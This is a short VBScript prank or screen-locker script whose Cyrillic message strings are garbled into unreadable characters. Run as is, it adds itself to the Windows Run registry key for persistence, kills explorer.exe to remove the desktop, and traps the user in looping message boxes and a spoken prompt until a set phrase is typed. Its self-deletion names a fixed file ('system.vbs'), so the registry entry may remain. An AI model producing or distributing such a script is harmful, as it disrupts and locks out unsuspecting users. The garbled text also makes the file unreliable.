CreateObject("WScript.Shell").RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Window", WScript.ScriptFullName
CreateObject("WScript.Shell").Run "taskkill /f /im explorer.exe"
Dim aa, ab
ab = 0
Do
  aa = MsgBox("�� ��� ���?", vbYesNo)
  If aa = 6 Then
    MsgBox "�����"
  ElseIf aa = 7 Then
    MsgBox "������ �����"
  End If
  aa = MsgBox("���������?", vbRetryCancel)
  If aa = 2 Then
    MsgBox "����� �����!"
    CreateObject("SAPI.SpVoice").Speak "��� ��� � ������� �����"
    aa = InputBox("���� ��� �����")
    If aa = "��� ��� � ������� �����" Then
      MsgBox "���������! � ������ ������ �� ������"
      aa = MsgBox ("��� ����������� �����-������?", vbYesNo)
      If aa=6 Then
        MsgBox "� �� ������"
        CreateObject("WScript.Shell").Run "explorer.exe"
        CreateObject("Scripting.FileSystemObject").DeleteFile "system.vbs"
        ab = 1
      End If
    Else
      MsgBox "�����������"
    End If
  End If
Loop Until ab = 1